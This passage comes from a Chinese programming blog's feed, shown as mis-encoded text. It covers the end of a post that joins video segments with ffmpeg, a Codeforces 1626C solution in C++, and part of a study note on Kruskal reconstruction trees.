class="keyword">for</span> q <span class="keyword">in</span> num:</span><br><span class="line">    fi+=<span class="built_in">str</span>(q)+<span class="string">&#x27;.ts|&#x27;</span></span><br><span class="line">cmd=<span class="string">&#x27;ffmpeg -i &quot;concat:&#x27;</span>+fi[:-<span class="number">1</span>]+<span class="string">&#x27;&quot; -c copy output.mp4&#x27;</span></span><br><span class="line">os.system(cmd)</span><br></pre></td></tr></table></figure><p>å¦‚æœä¸æ”¾å¿ƒå¯ä»¥å…ˆprintä¸€ä¸‹çœ‹çœ‹å¾—åˆ°çš„cmdæ˜¯ä»€ä¹ˆæ ·çš„ï¼Œä¸‹é¢ç»™å‡ºæˆ‘çš„ç›®å½•å›¾å’Œè¿è¡Œå›¾ï¼š</p><p><img src="/2022/03/20/Dingtalk/5.png" alt="5"></p><p>æœ€åå°±æ˜¯è¿è¡Œä¸€éé‚£ä¸ªå‘½ä»¤äº†ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å¾—åˆ°ä½ ä»¬å¿ƒå¿ƒå¿µå¿µçš„è§†é¢‘å§ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CF1626C</title>
      <link href="/2022/03/19/CF1626C/"/>
      <url>/2022/03/19/CF1626C/</url>
      
        <content type="html"><![CDATA[<p>ä¸€é“æ€ç»´å¥½é¢˜ï¼Œå†™ç¯‡é¢˜è§£çºªå¿µä¸€ä¸‹ã€‚</p><span id="more"></span><h3 id="Problem-Description"><a href="#Problem-Description" class="headerlink" title="Problem Description"></a>Problem Description</h3><p>æœ‰ $n$ ä¸ªæ•Œäººï¼Œä½ éœ€è¦åœ¨ç¬¬ $k_i$ ç§’ç”¨è‡³å°‘ $h_i$ çš„æ”»å‡»åŠ›æ‰“è´¥è¿™ä¸ªæ•Œäººã€‚</p><p>æ”»å‡»åŠ›çš„è®¡ç®—æ–¹å¼å¦‚ä¸‹ï¼š</p><ol><li> ç¬¬ä¸€ç§’æ—¶ï¼Œä½ æœ‰ $1$ æ”»å‡»åŠ›</li><li> å¯¹äºåé¢çš„ä»»æ„ä¸€ç§’ï¼Œè‹¥å‰ä¸€ç§’ä½ çš„æ”»å‡»åŠ›ä¸º $x$ï¼Œåˆ™è¿™ä¸€ç§’ä½ çš„æ”»å‡»åŠ›å¯ä»¥ä¸º $x+1$ æˆ– $1$</li></ol><p>ä¸€ç§’å†…ï¼Œå¦‚æœä½ çš„æ”»å‡»åŠ›ä¸º $x$ï¼Œåˆ™ä½ å°±éœ€è¦æ¶ˆè€— $x$ çš„èƒ½é‡ã€‚</p><p>è¯·é—®ï¼Œåœ¨ä½ æ‰“è´¥æ‰€æœ‰æ•Œäººçš„æƒ…å†µä¸‹ï¼Œæœ€å°‘éœ€è¦æ¶ˆè€—å¤šå°‘èƒ½é‡ã€‚</p><h2 id="é¢˜ç›®åˆ†æ"><a href="#é¢˜ç›®åˆ†æ" class="headerlink" title="é¢˜ç›®åˆ†æ"></a>é¢˜ç›®åˆ†æ</h2><p>åœ¨ä¸€ç§’å†…ï¼Œä½ å¯ä»¥ç»§æ‰¿ä¹‹å‰çš„æ”»å‡»åŠ›ï¼Œä½†æ˜¯ç»§æ‰¿æ”»å‡»åŠ›çš„ä»£ä»·å°±æ˜¯ä½ è¦èŠ±è´¹ç›¸å½“äºç»§æ‰¿ä¹‹åæ”»å‡»åŠ›çš„æ³•åŠ›å€¼æ¥ä¿å­˜ä½ çš„æ”»å‡»åŠ›ã€‚åªæœ‰å½“å‰æ”»å‡»åŠ›å¤§äºå½“å‰å‡ºç°çš„æ€ªç‰©çš„è¡€é‡çš„æ—¶å€™ï¼Œä½ æ‰èƒ½æ€æ­»ä»–ã€‚åœ¨ä»»æ„ä¸€ç§’ï¼Œä½ å¯ä»¥é€‰æ‹©æ‘†çƒ‚ï¼Œä½†æ˜¯æ‘†çƒ‚çš„ä»£ä»·å°±æ˜¯ä¼šä¸¢å¤±ä¸Šä¸€ç§’çš„æ”»å‡»åŠ›ï¼Œä½¿ä½ åœ¨ä¸‹ä¸€ç§’çš„æ—¶å€™æ— æ³•æœ‰ä¹‹å‰é‚£ä¹ˆé«˜çš„æ”»å‡»ï¼Œæ‘†çƒ‚å¯ä»¥é€‰æ‹©ä» $0$ å¼€å§‹æˆ–è€…ä» $1$ å¼€å§‹ã€‚æ˜¾ç„¶å¯ä»¥å‘ç°ï¼Œå½“ $k_i\ge h_i$ çš„æ—¶å€™ï¼Œä¸»è§’æ€»æ˜¯æœ‰åŠæ³•æ€æ­»æ‰€æœ‰çš„æ€ªç‰©çš„ã€‚ </p><p>åœ¨æ€æ­»æ‰€æœ‰çš„æ€ªç‰©çš„æ€ªç‰©ä¸‹è¦ä¿è¯æ¶ˆè€—çš„æ³•åŠ›å€¼æœ€å°‘ï¼Œé‚£å°±éœ€è¦æˆ‘ä»¬åˆç†åˆ†é…å¢åŠ æ”»å‡»çš„æ—¶é—´äº†ã€‚æˆ‘ä»¬ä¸éš¾å¾—å‡ºä»¥ä¸‹ç»“è®ºï¼š</p><p>å¦‚æœåœ¨ç¬¬ $k_i$ ç§’é‡åˆ°äº†è¡€é‡ä¸º $h_i$ çš„æ€ªç‰©ï¼Œé‚£ä¹ˆåœ¨ $(k_i-h_i,k_i]$ çš„æ—¶é—´åŒºé—´å†…ï¼Œæˆ‘ä¸èƒ½å‡ºç°æ‘†çƒ‚çš„æƒ…å†µï¼Œå³æ”»å‡»åŠ›ä¸èƒ½æ‰ï¼Œåœ¨ $k_i-h_i$ çš„æ—¶åˆ»ï¼Œæ”»å‡»åŠ›ä¸èƒ½å‡ä¸º $0$ã€‚</p><p>é‚£ä¹ˆç¬¬ $i$ ä¸ªæ€ªç‰©éœ€è¦æˆ‘èŠ±è´¹çš„æœ€å°‘æ³•åŠ›å€¼å°±æ˜¯ä» $1$ åˆ° $h_i$ çš„ç­‰å·®æ•°åˆ—ï¼Œå‡è®¾æˆ‘æ‰“å®Œæ€ªç‰©ä¹‹åæˆ‘éƒ½èƒ½ç«‹åˆ»æ‘†çƒ‚ï¼Œé‚£ä¹ˆä¸éš¾å¾—å‡ºæ€»æ³•åŠ›æ¶ˆè€—å°±æ˜¯ $\sum _{i=1}^{n} \sum _{j=1}^{h_i} j$ ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯æ¯ä¸€æ¬¡æ‰“å®Œæ€ªç‰©æˆ‘éƒ½èƒ½æ‘†çƒ‚ï¼Œå¦‚æœæˆ‘æ‘†çƒ‚åˆ° $0$ï¼Œå‰©ä¸‹çš„æ—¶é—´ä¸è¶³ä»¥æˆ‘ç§¯æ”’è¶³å¤Ÿçš„æ”»å‡»å»å‡»æ€æ¥ä¸‹æ¥çš„æ€ªç‰©é‚£å°±ä¸èƒ½æ‘†çƒ‚è€Œæ˜¯æ¥ç€è“„åŠ›ã€‚</p><p>å¯¹äºæ¯ä¸€ä¸ªæ€ªç‰©æˆ‘ä»¬éƒ½æ„é€ ä¸€ä¸ªåŒºé—´ï¼ŒåŒºé—´èŒƒå›´ä¸º $[k_i-h_i+1,k_i]$ ï¼Œå½“åŒºé—´å‡ºç°ç›¸äº¤ï¼Œåˆ™åˆå¹¶ä¸¤ä¸ªåŒºé—´ï¼Œæœ€åæ ¹æ®åŒºé—´é•¿åº¦è®¡ç®—æ³•åŠ›å€¼å³å¯ã€‚</p><p>å¯¹äºæ¯ä¸€ä¸ªåŒºé—´æˆ‘è§‚å¯Ÿæˆ‘çš„å·¦ç«¯ç‚¹æ˜¯å¦ä¼šè½åœ¨ä¸Šä¸€ä¸ªåŒºé—´å†…ï¼Œå¦‚æœåœ¨ï¼Œåˆ™éœ€è¦åˆå¹¶å‰é¢çš„åŒºé—´ï¼Œå› ä¸ºæˆ‘ä»¬é»˜è®¤æŒ‰ç…§ $k_i$ æ’åºäº†ï¼Œä¹Ÿå°±æ˜¯æŒ‰ç…§åŒºé—´å³ç«¯ç‚¹å€¼æ’åºï¼Œæ‰€ä»¥æˆ‘å¯ä»¥ç”¨ $\text{lower_bound}$ æ¥å¯»æ‰¾åˆå¹¶çš„åŒºé—´ã€‚å› ä¸ºå¦‚æœæœ€åä¸€ä¸ªæ€ªç‰©å®ƒè¦æ±‚æˆ‘ä»ç¬¬ä¸€ç§’å¼€å§‹è“„åŠ›çš„è¯ï¼Œé‚£ä¹ˆå‰é¢çš„æ‰€æœ‰åŒºé—´æˆ‘éƒ½è¦åˆå¹¶ï¼Œæ‰€ä»¥è¿™é‡Œå¿…é¡»è€ƒè™‘åˆå¹¶çš„åŒºé—´ã€‚å¯¹äºåˆå¹¶çš„åŒºé—´æˆ‘ä»¬ä¿®æ”¹ $l$ ä¸ºå…¶ä¸­æœ€å°å€¼ï¼Œ$r$ ä¸ºå…¶ä¸­æœ€å¤§å€¼ã€‚ç„¶ååœ¨è®¡ç®—åŒºé—´çš„æ—¶å€™ç‰¹åˆ¤ä¸€ä¸‹è¿ç»­çš„åŒºé—´æ˜¯å¦ç›¸ç­‰ï¼Œè¾¾åˆ°åªè®¡ç®—ä¸€æ¬¡çš„ç›®çš„å³å¯ã€‚</p><h3 id="æ ‡ç¨‹"><a href="#æ ‡ç¨‹" class="headerlink" title="æ ‡ç¨‹"></a>æ ‡ç¨‹</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 105</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> h[maxn],k[maxn],l[maxn],r[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="built_in">memset</span>(l,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="built_in">memset</span>(r,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(l));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;k[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)cin&gt;&gt;h[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        l[i]=k[i]-h[i]+<span class="number">1</span>;</span><br><span class="line">        r[i]=k[i];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]&lt;=r[i<span class="number">-1</span>])&#123;</span><br><span class="line">            <span class="keyword">int</span> j=i;</span><br><span class="line">            <span class="keyword">int</span> p=<span class="built_in">lower_bound</span>(r+<span class="number">1</span>,r+<span class="number">1</span>+i,l[i])-r;</span><br><span class="line">            <span class="comment">//if(p==0)p++;</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=p;j&lt;=i;j++)&#123;</span><br><span class="line">                l[j]=<span class="built_in">min</span>(l[p],l[i]);</span><br><span class="line">                r[j]=r[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(l[i]==l[i<span class="number">-1</span>]&amp;&amp;r[i]==r[i<span class="number">-1</span>])<span class="keyword">continue</span>;</span><br><span class="line">        <span class="keyword">int</span> num=r[i]-l[i]+<span class="number">1</span>;</span><br><span class="line">        ans+=<span class="number">1ll</span>*(num+<span class="number">1</span>)*num/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span>(l[i]-r[i<span class="number">-1</span>]&gt;<span class="number">1</span>&amp;&amp;l[i<span class="number">-1</span>]!=<span class="number">0</span>)&#123;</span><br><span class="line">            ;<span class="comment">//ans+=l[i]-r[i-1]-1;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.in&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> æ€ç»´ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kruskal é‡æ„æ ‘çš„å­¦ä¹ ç¬”è®°</title>
      <link href="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/"/>
      <url>/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>æ¯”èµ›é‡åˆ°äº†æ–°é²œçš„å›¾è®ºé¢˜ï¼Œç‰¹æ­¤è®°å½•ã€‚</p><span id="more"></span><h2 id="ä»€ä¹ˆæ˜¯Kruskalé‡æ„æ ‘ï¼Ÿ"><a href="#ä»€ä¹ˆæ˜¯Kruskalé‡æ„æ ‘ï¼Ÿ" class="headerlink" title="ä»€ä¹ˆæ˜¯Kruskalé‡æ„æ ‘ï¼Ÿ"></a>ä»€ä¹ˆæ˜¯Kruskalé‡æ„æ ‘ï¼Ÿ</h2><p> $\text{Kruskal}$ é‡æ„æ ‘ï¼Œå’Œ $\text{Kruskal}$ ç®—æ³•çš„æ€æƒ³å·®ä¸å¤šï¼Œå°±æ˜¯åœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å»ºå‡ºä¸€ä¸ªæœ‰ç€éå¸¸ä¼˜ç§€çš„æ€§è´¨çš„æ•°æ®ç»“æ„ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸å°‘è§å’Œå°ä¼—çš„ç®—æ³•ï¼Œä½†æ˜¯å¦‚æœç¢°åˆ°äº†åˆé€‚çš„é¢˜ç›®ï¼Œå°±ä¼šä½“ç°å‡ºå…¶ä¼˜è¶Šæ€§ã€‚</p><h2 id="å¦‚ä½•å®ç°ï¼Ÿ"><a href="#å¦‚ä½•å®ç°ï¼Ÿ" class="headerlink" title="å¦‚ä½•å®ç°ï¼Ÿ"></a>å¦‚ä½•å®ç°ï¼Ÿ</h2><p>æ—¢ç„¶å®ƒå« $\text{Kruskal}$ é‡æ„æ ‘ï¼Œé‚£ä¹ˆå®ƒå¿…ç„¶ä¸ $\text{Kruskal}$ æœ‰ç€å¯†ä¸å¯åˆ†çš„è”ç³»ã€‚é¦–å…ˆæˆ‘ä»¬å›é¡¾ä¸€ä¸‹ $\text{Kruskal}$ æœ€å°ç”Ÿæˆæ ‘æ˜¯æ€ä¹ˆå®ç°çš„ï¼Œå…ˆå°†æ‰€æœ‰è¾¹æŒ‰ç…§æƒå€¼æ’åºï¼Œç„¶åå†ä»å°åˆ°å¤§æ·»åŠ è¾¹ï¼Œå¦‚æœæ·»åŠ è¾¹çš„ä¸¤ä¸ªé¡¶ç‚¹éƒ½åœ¨ç”Ÿæˆæ ‘å½“ä¸­åˆ™è·³è¿‡è¿™æ¡è¾¹ï¼Œç›´åˆ°æ·»åŠ è¿‡n-1æ¬¡ç®—æ³•ç»“æŸã€‚</p><p>æˆ‘ä»¬åœ¨æ·»åŠ è¾¹çš„æ—¶å€™æ„é€ ä¸€æ£µè¿™æ ·çš„æ ‘ï¼šå½“è¾¹eè¢«æ·»åŠ æ—¶ï¼Œeçš„ä¸¤é¡¶ç‚¹ä¸€å®šåœ¨ä¸åŒçš„ç”Ÿæˆæ ‘å†…ï¼Œå› æ­¤å°†ä¸¤ä¸ªé¡¶ç‚¹æ‰€åœ¨çš„æ ‘ç”¨ä¸€ä¸ªç‚¹è¿æ¥èµ·æ¥ï¼Œç‚¹çš„æƒå€¼ä¸ºè¿™æ¡è¾¹çš„æƒå€¼ï¼Œè¿™ä¸ªç‚¹çš„æƒå€¼è¡¨ç¤ºäº†ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯è¿™ä¸¤ä¸ªå­æ ‘ä¸Šï¼Œå…¶ä¸­ä¸€ä¸ªå­æ ‘æ‰€æœ‰çš„é¡¶ç‚¹åˆ°å¦ä¸€ä¸ªå­æ ‘çš„æ‰€æœ‰é¡¶ç‚¹ä¸­ç»è¿‡çš„è¾¹çš„æœ€å¤§å€¼çš„æœ€å°å€¼ä¸ºè¿™æ¡è¾¹çš„è¾¹æƒã€‚</p><p>é¦–å…ˆå…ˆè§£é‡Šä¸€ä¸‹ä»€ä¹ˆå«<strong>æœ€å¤§å€¼çš„æœ€å°å€¼</strong>ï¼Œè¿™å¥è¯å¯èƒ½æœ‰ç‚¹æŠ½è±¡ï¼Œé‚£æˆ‘å…·ä½“ä¸¾ä¸€ä¸ªä¾‹å­ã€‚æˆ‘ä¸€ä¸ªèŠ‚ç‚¹ä» $u\to v$ æœ‰å¯èƒ½ç»è¿‡å¤šæ¡è¾¹ï¼Œè¿™é‡Œé¢çš„æœ€å¤§å€¼æ˜¯æˆ‘è¦è®¡ç®—çš„ï¼Œè€Œå¯èƒ½ä¸æ­¢è¿™ä¸€ç§èµ°æ³•ï¼Œæˆ‘ç°åœ¨å¸Œæœ›è¿™ä¸ªæœ€å¤§å€¼æœ€å°ï¼Œè¿™å°±æ˜¯æ‰€è°“çš„æœ€å¤§å€¼çš„æœ€å°å€¼å•¦ã€‚æœ€å¤§å€¼æŒ‡çš„æ˜¯ä¸€æ¡è·¯å¾„çš„æœ€å¤§å€¼ï¼Œæœ€å°å€¼æŒ‡çš„æ˜¯æ‰€æœ‰è·¯å¾„ä¸­çš„è¿™ä¸ªå€¼æœ€å°ã€‚</p><p>å…¶æ¬¡ï¼Œå¾ˆå®¹æ˜“è¯æ˜æˆ‘ä»¬å¾—åˆ°çš„æ ‘æ˜¯ä¸€é¢—äºŒå‰æ ‘ï¼Œå› ä¸ºå¯¹äºnä¸ªç‚¹ï¼Œæ¯æ¬¡æˆ‘éƒ½æ˜¯æ·»åŠ æ ¹èŠ‚ç‚¹è¿æ¥ä¸¤ä¸ªå­æ ‘æˆ–è€…èŠ‚ç‚¹ï¼Œä¹Ÿå¾ˆå®¹æ˜“è¯æ˜å¶èŠ‚ç‚¹éƒ½ä¸ºåŸå›¾ä¸­çš„èŠ‚ç‚¹ï¼Œå› ä¸ºæˆ‘ä»¬åªä¸ºè¿™äº›èŠ‚ç‚¹ä¸åœåœ°æ·»åŠ çˆ¶äº²è€Œæ²¡æœ‰ç»™ä»–ä»¬å„¿å­ï¼Œè‡ªç„¶å°±æ˜¯å¶å­èŠ‚ç‚¹å•¦ã€‚</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>exp(æŒ‡example</p><p>ä¸¾ä¸ªä¾‹å­ï¼Œä¸‹é¢è¿™ä¸ªå›¾ã€‚</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/1.png" alt="1"></p><p>ç¬¬ä¸€æ­¥ï¼Œæˆ‘ä»¬å…ˆé€‰æ‹©1å’Œ2ï¼Œå‘ç°ä¸åœ¨åŒä¸€é›†åˆï¼Œé€‰æ‹©æ·»åŠ ï¼Œæˆ‘ä»¬æ–°å»ºä¸€ä¸ªèŠ‚ç‚¹æ¥ä½œä¸ºå®ƒä»¬çš„çˆ¶äº²ï¼Œå®ƒçš„ç‚¹çš„æƒå€¼ä¸º1ï¼Œè¿™é‡Œæˆ‘æ¢ä¸ªé¢œè‰²é¿å…å¼•èµ·æ­§ä¹‰ï¼Œè¿™é‡Œçš„1è¡¨ç¤ºå€¼è€Œä¸æ˜¯ç¼–å·ã€‚</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/2.png" alt="2"></p><p>é‡å¤ç¬¬ä¸€æ­¥ï¼Œæ‰¾åˆ°2ï¼Œç„¶åã€‚</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/3.png" alt="3"></p><p>ç„¶åæ‰¾åˆ°æƒå€¼ä¸º3çš„ç‚¹ï¼Œå‘ç°1ï¼Œ3åŒå±äºä¸€ä¸ªæ ‘ï¼Œè·³è¿‡ã€‚å†æ‰¾åˆ°4ï¼Œæ·»åŠ ï¼Œå¾—åˆ°ä¸‹é¢è¿™å¼ å›¾ã€‚</p><p><img src="/2022/03/08/Kruskal%E9%87%8D%E6%9E%84%E6%A0%91/4.png" alt="4"></p><p>æˆ‘ä»¬æ¥çœ‹çœ‹ç¬¦ä¸ç¬¦åˆæˆ‘ä»¬ä¸Šé¢æ€»ç»“çš„é‚£ä¸ªç»“è®ºã€‚</p><p>1å’Œ2æˆ‘ä»¬èµ°è¿‡çš„æœ€çŸ­è·¯å¾„æ˜¾ç„¶å°±æ˜¯1ï¼›1åˆ°3æˆ‘ä»¬éœ€è¦èµ°è¿‡è·¯å¾„æœ€å¤§å€¼çš„æœ€å°å€¼æ˜¯2ï¼Œè™½ç„¶æˆ‘èƒ½ä¸€æ­¥åˆ°è¾¾ï¼Œä½†æ˜¯å…ˆèµ°2ï¼Œå†èµ°3æˆ‘ä»¬çš„è·¯å¾„é•¿åº¦ä¸º $\to 1\to 2 \to$ æ˜¾ç„¶è¿™æ ·èµ°è¿‡çš„æœ€é•¿çš„è·¯çš„æœ€å°å€¼å°±æ˜¯2äº†ï¼Œå¯ä»¥å‘ç°1å’Œ3ç”±æ ¹èŠ‚ç‚¹æƒå€¼ä¸º2çš„ç‚¹è¿æ¥ï¼Œä¹Ÿæ²¡é—®é¢˜ï¼ŒåŒç†å…¶å®ƒä»»ä½•å››ä¸ªç‚¹ä¸¤ä¸¤ä¹‹é—´éƒ½ç¬¦åˆè¿™ä¸ªè§„å¾‹ã€‚</p><p>åœ¨å®ç°ä¸Šé¢æˆ‘ä»¬å¯ä»¥é€šè¿‡LCAæ¥å¿«é€ŸæŸ¥è¯¢ä¸¤ä¸ªç‚¹ä¹‹é—´çš„æœ€å¤§è·¯å¾„çš„æœ€å°å€¼ï¼Œå› ä¸ºä¹Ÿå¯ä»¥å‘ç°ä¸¤ä¸ªç‚¹ä¹‹é—´çš„LCAçš„æƒå€¼å°±æ˜¯æˆ‘æƒ³è¦çš„ç­”æ¡ˆï¼Œè¿™ä¸€éƒ¨åˆ†å¯ä»¥å€å¢é¢„å¤„ç†ç„¶åæ‰“åˆ°ä¸€æ¬¡ $log_2n$ çš„å¤æ‚åº¦ã€‚</p><h2 id="æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"><a href="#æœ‰ä»€ä¹ˆç”¨ï¼Ÿ" class="headerlink" title="æœ‰ä»€ä¹ˆç”¨ï¼Ÿ"></a>æœ‰ä»€ä¹ˆç”¨ï¼Ÿ</h2><p>è¿™åº”è¯¥æ˜¯æˆ‘ä»¬æœ€åº”è¯¥å…³å¿ƒçš„é—®é¢˜äº†ï¼Œå­¦äº†ä¸€ä¸ªæ•°æ®ç»“æ„åº”è¯¥æƒ³åŠæ³•åŠ ä»¥åˆ©ç”¨ã€‚æ¥çœ‹ä¸€é“ç»å…¸ä¾‹é¢˜ï¼š</p><hr><p>ç»™å‡ºnä¸ªç‚¹ï¼Œmæ¡è¾¹æ„æˆçš„æ— å‘å›¾ï¼Œè¦æ±‚æŒ‡å®šä¸¤ç‚¹ï¼Œç®—å‡ºå®ƒä»¬ä¹‹é—´çš„æœ€çŸ­è·¯å¾„å€¼ã€‚</p><p>è¿™é¢˜å¾ˆå®¹æ˜“çŸ¥é“å¯ä»¥ä½¿ç”¨å•æºæœ€çŸ­è·¯ç®—æ³•ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿä¼šæƒ³åˆ°åŠ¨æ€è§„åˆ’ã€‚å› ä¸ºæˆ‘åˆ°äº†ä¸€ä¸ªç‚¹ä¹‹åï¼Œæˆ‘ä¸éœ€è¦å…³å¿ƒè¿™ä¸ªç‚¹æ˜¯æ€ä¹ˆåˆ°çš„ï¼Œè¿™ä¸ªå«æ— åæ•ˆæ€§ï¼Œå³å‰é¢çš„å†³ç­–ä¸å½±å“åé¢çš„ç­”æ¡ˆã€‚</p><p>é‚£æˆ‘ä»¬å¯¹æ­¤é¢˜ç¨å¾®æ”¹ä¸€ä¸‹ï¼šè¦æ±‚æ±‚å‡ºæ‰€æœ‰æˆ‘ç»è¿‡è·¯å¾„æœ€å¤§å€¼çš„æœ€å°å€¼æ˜¯å¤šå°‘ï¼Ÿ</p><p>è¿™é¢˜æ˜¾ç„¶ï¼Œä¹Ÿæ˜¯æ— åæ•ˆæ€§æˆ‘ä»¬åªéœ€è¦ä¸€æ­¥æ­¥å¾€å‰æ¨ç„¶åä¿å­˜æœ€å¤§å€¼å³å¯ã€‚ä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œå¦‚æœæˆ‘å†åŠ ä¸Šå¤šä¸ªè¯¢é—®å‘¢ï¼Ÿé‚£ä¹ˆæ­¤æ—¶ç®—æ³•çš„æ—¶é—´å¤æ‚åº¦å°†åŠ ä¸Šnå€ï¼Œä¸€æ¬¡å¤„ç†ç›¸å½“äºè¿›è¡Œä¸€æ¬¡çš„ $\text{dijkstra}$ï¼Œ$O(nlog_2n)$çš„å¤æ‚åº¦ï¼Œå¦¥å¦¥çš„è¶…æ—¶ã€‚å¦‚æœæˆ‘ä»¬é€‰æ‹© $\text{Kruskal}$ é‡æ„æ ‘é¢„å¤„ç†ï¼Œå†åŠ ä¸ŠåŠ ä¸ŠLCAï¼ŒæŠŠä¸€æ¬¡è¯¢é—®çš„å¤æ‚åº¦é™ä½åˆ° $O(log_2n)$ ï¼Œé‚£ä¹ˆæœ€ç»ˆå¾—åˆ°çš„ç®—æ³•å¤æ‚åº¦å°±ä¼šä½å¾ˆå¤šäº†ã€‚</p><h2 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h2><p>ç›´æ¥æ‹¿ä¸ŠICPC2021ä¸Šæµ·ç«™çš„Ié¢˜â€”â€”<a href="https://ac.nowcoder.com/acm/contest/29789/H">Life is a game</a></p><hr><h4 id="é¢˜ç›®æè¿°"><a href="#é¢˜ç›®æè¿°" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h4><p>Life is a game.</p><p> The world can be regarded as an undirected connected graph of $n$ cities and mmm undirected roads between the cities. Now you, the life game player, are going to play the life game on the world graph.</p><p> Initially, you are at the $x$-th city and of $k$ social ability points. You can earn social ability points by living and working. Specifically, you can earn $a_i$ social ability points by living and working in the $i$-th city. But in this problem, you cannot earn social ability points duplicatedly in one city, so you want to travel the world and earn more social ability points. However, the roads are not easy. Specifically, there is an ability threshold $i$_iwiâ€‹ for the $i$-th road, you should be of at least $w_i$ social ability points to go through the road. Moreover, Your social ability point will not decrease when passing roads but just need to be at least $w_i$â€‹ if you want to go through the $i$-th road.</p><p> So as you can see, the life game is just living, working and traveling repeatedly. There are $q$ game saves. For each game save, the initial city and social ability point is given and the player has not lived or worked in any city. Now you, the real life game player, need to determine the maximum possible number of social ability points you can have in the end of the game and output it for each given game save.</p><p>è¿™é‡Œæ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªé¢˜æ„ã€‚</p><p>å°±æ˜¯è¯´æœ‰ä¸€ä¸ª $n$ ç‚¹ $m$ è¾¹çš„æ— å‘å¸¦æƒå›¾ï¼Œæ¯ä¸ªç‚¹ä¸Šæœ‰æƒå€¼ã€‚å½“ä½ ç»è¿‡ä¸€ä¸ªç‚¹ï¼Œä½ 